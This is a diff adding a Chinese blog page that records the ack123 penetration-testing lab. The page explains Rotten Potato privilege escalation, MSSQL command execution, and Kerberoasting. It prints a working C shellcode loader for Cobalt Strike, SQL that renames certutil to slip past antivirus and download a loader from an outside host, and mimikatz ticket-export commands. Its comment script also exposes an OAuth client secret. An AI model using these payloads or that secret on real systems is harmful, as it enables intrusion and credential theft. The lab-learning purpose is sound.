@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="1y0ng" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      暗月ack靶场学习记录 
+      
+      
+      |
+    
+     1y0ng&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon2.png">
+    <link rel="icon" href="/images/favicon2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/favicon2.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">1y0ng</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/Tool/">
+          <a href="/Tool/">Tool</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">暗月ack靶场学习记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-06-14 19:51:01
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E9%9D%B6%E5%9C%BA/" title="靶场">
+                    #靶场
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录</p>
+<h1 id="烂土豆（RottenPotato）">烂土豆（RottenPotato）</h1>
+<p><code>烂土豆（Rotten Potato） MS16-075</code> 是一种利用 Windows 客户端操作系统中 NT AUTHORITY\SYSTEM 权限漏洞的攻击方法,可以实现本地提权,对应的补丁号为<code>KB3164038</code></p>
+<p>适用版本：<code>Windows 7、8、10、2008、2012</code></p>
+<p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码</p>
+<p>若要利用此漏洞,攻击者首先必须登录系统。然后,攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序,从而控制受影响的系统,可见,该漏洞的利用方式还是比较简单的</p>
+<p>首先在拥有一个登录用户的情况下输入<code>whoami /prive</code>查看当前用户的权限</p>
+<p>如果发现有<code>SeAssignPrimaryTokenPrivilege</code>权限或者<code>SeImpersonatePrivilege</code> 权限并且系统未打对应的补丁则可以成功利用烂土豆提权</p>
+<h1 id="MSSQL拿shell">MSSQL拿shell</h1>
+<p>拿到sql server的<code>sa账户</code>以后可以通过<code>xp_cmdshell</code>来执行系统命令</p>
+<p>先判断xp_shell是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure>
+<p>如果显示0则可以通过以下命令重新加载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure>
+<p>执行命令方法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure>
+<p>在命令执行之后下一步的目标就是拿shell,这里采用的方法是利用windows自带的<code>certutil</code>下载shellcode加载器</p>
+<p>但是使用xp_cmdshell去调用certutil会发现被火绒拦截了,所以我们需要使用<code>sp_oacreate</code>来执行命令</p>
+<blockquote>
+<p><code>xp_cmdshell</code> 和 <code>sp_oacreate</code> 都是 SQL Server 中用于执行操作系统命令的工具,但是它们之间存在一些差异</p>
+<p><code>xp_cmdshell</code> 是在 SQL Server 上直接调用 Windows 的 <code>cmd.exe</code> 执行指定的命令,因此容易被杀毒软件和防火墙拦截。当执行 <code>xp_cmdshell</code> 命令时,如果杀毒软件或防火墙检测到其中包含有潜在的安全威胁,则可能会立即阻止该命令的执行</p>
+<p>相比之下,<code>sp_oacreate</code> 是使用 SQL Server 的 COM (组件对象模型) 接口创建一个外部对象,并通过该对象调用操作系统命令,因此在某种程度上可以绕过杀毒软件或防火墙的检测。但是,由于它需要使用 COM 对象,而且需要启用 <code>Ole Automation Procedures</code> 选项才能使用,因此在某些情况下可能不太方便使用</p>
+</blockquote>
+<p><code>sp_oacreate</code>可以删除、复制、移动文件,还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>,但是<code>sp_oamethod</code>无回显</p>
+<p>首先要开启<code>sp_oacreate</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+<p>将 certutil.exe 复制到 C:\Windows\Temp\ 下,并重命名为 sethc.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @o int; exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure>
+<p>生成cobalt strike 的shellcode加载器</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [binary string]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][i * <span class="number">2</span>], <span class="string">&quot;%2hhx&quot;</span>, &amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请内存（权限为rwx）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="number">1024</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode复制进申请的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(exec, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用Visual Studio编译生成load.exe</p>
+<p>certutil 工具远程下载 loader.exe</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &quot;http://192.168.59.1/loader.exe&quot; C:\Windows\Temp\loader.exe&#x27;</span><br></pre></td></tr></table></figure>
+<p>xp_cmdshell 执行命令加载 shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;C:\Windows\Temp\loader.exe shellcode二进制木马‘</span><br></pre></td></tr></table></figure>
+<h1 id="kerberosting">kerberosting</h1>
+<p><code>Kerberoast </code>是一种针对 Kerberos 身份验证协议的攻击技术,用于从域控制器获取受保护的服务账户（Service Account）密码哈希值并进行破解</p>
+<p>流程如下：</p>
+<p><img src="image-20230430190501680.png" alt="image-20230430190501680"></p>
+<p>攻击者拿到ST用于本地离线爆破,如果字典足够强大则可以爆破出SPN链接用户的明文密码</p>
+<p>这个过程中,客户端在请求ST的时候是可以<code>协商所使用的加密算法</code>,只有使用的是<code>RC4加密</code>才有可能被爆破出来</p>
+<blockquote>
+<p>kerberosting一般只攻击注册下用户下的SPN,而机器账户的密码是随机生成的128位字符,不太可能爆破出来</p>
+</blockquote>
+<p>首先查询某个域中的SPN信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li>setspn：setspn 是一个 Windows 命令行工具,用于管理和操作 Active Directory 中的 SPN 信息</li>
+<li>-T <a target="_blank" rel="noopener" href="http://ack123.com">ack123.com</a>：指定要查询的域或计算机名称,例如 <a target="_blank" rel="noopener" href="http://ack123.com">ack123.com</a> 表示查询该域中的 SPN 信息</li>
+<li>-q：指定要执行的操作类型,这里表示查询 SPN 信息。</li>
+<li><em>/</em>：指定要查询的所有 SPN 类型和名称,包括服务类别和实例名称。其中 * 表示通配符,表示任意字符或字符串</li>
+</ul>
+</blockquote>
+<p>SPN命令格式:<code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></p>
+<p>在web2中可以看到Administrator注册了一个mysql的SPN</p>
+<p><img src="image-20230430191030997.png" alt="image-20230430191030997"></p>
+<p>接下来使用mimikatz请求SPN的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure>
+<p>导出当前票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+<p>利用kerberoast.exe爆破即可成功获取Administrator的密码明文</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/15667624.html">渗透测试带防御的内网域（ack123靶场）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38850916/article/details/124801004">内网渗透、三层拓扑、红队考核靶场(ack123)</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/422937627">CS-Shellcode分析（一）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/2023/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-06-14 19:51:01
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E9%9D%B6%E5%9C%BA/" title="靶场">
+                        #靶场
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/2023/%E5%88%9D%E8%AF%86JAVA%E5%86%85%E5%AD%98%E9%A9%AC/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%EF%BC%88RottenPotato%EF%BC%89"><span class="toc-text">烂土豆（RottenPotato）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSSQL%E6%8B%BFshell"><span class="toc-text">MSSQL拿shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#kerberosting"><span class="toc-text">kerberosting</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '94b011918fa9c2f8b107',
+        clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+        repo: '1y0ng.github.io',
+        owner: '1y0ng',
+        admin: ['1y0ng'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2F2023%2F%25E6%259A%2597%25E6%259C%2588ack%25E9%259D%25B6%25E5%259C%25BA%25E5%25AD%25A6%25E4%25B9%25A0%25E8%25AE%25B0%25E5%25BD%2595%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/2023/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
